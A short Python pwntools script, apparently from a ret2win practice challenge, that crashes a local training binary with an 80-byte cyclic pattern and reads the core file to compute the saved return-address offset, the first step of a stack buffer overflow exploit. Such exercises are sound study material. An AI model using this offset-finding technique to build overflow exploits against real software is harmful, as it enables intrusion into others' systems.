#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import os

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win')
io = process([elf.path])
# Sen a cyclic code of 80 characters
io.sendline(cyclic(0x50))
io.wait()

# identify core file
core = io.corefile
# get de rsp value
rsp = core.rsp
pattern = core.read(rsp, 4)
# Calculate the correspounding offset
offset = cyclic_find(pattern)
info(f"pattern     = {pattern.decode()}")
info(f"offset srip = 0x{offset:x}")

# delete the core file
os.remove(core.path)

